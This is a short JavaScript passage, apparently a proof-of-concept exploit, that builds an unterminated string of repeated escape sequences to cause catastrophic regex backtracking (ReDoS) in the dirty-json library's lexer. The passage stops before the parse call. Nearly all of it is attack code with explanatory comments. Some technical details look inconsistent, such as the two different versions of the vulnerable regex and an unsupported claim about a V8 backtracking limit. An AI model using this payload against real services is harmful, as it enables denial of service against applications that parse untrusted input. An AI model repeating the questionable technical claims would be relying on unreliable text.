const dirtyJson = require('dirty-json');

async function exploit() {
  // The vulnerable regex pattern in getLexer for quoted strings is:
  // /"((?:[^"\\]+|\.)*)("|$)/
  // 
  // When the closing delimiter (") or end-of-string ($) is absent, the engine
  // must backtrack through every possible split of the alternating groups:
  // (?:[^"\\]+ | \\.)*
  // This creates an exponential backtracking path that rapidly consumes CPU
  // and hits the V8 regex backtracking limit (~30,000 in controlled/research environments).

  let payload = '"';

  // Inject a long sequence of escaped-like sequences without a terminating quote.
  // Each "\." segment is ambiguous to the backtracking engine when the terminator fails.
  for (let i = 0; i < 85; i++) {
    payload += '\\a\\b\\c\\d'; 
  }

  // Parse the malicious input. getLexer() will immediately run the vulnerable rule,
  // triggering catastrophic backtracking without ever finding a valid closing quote.
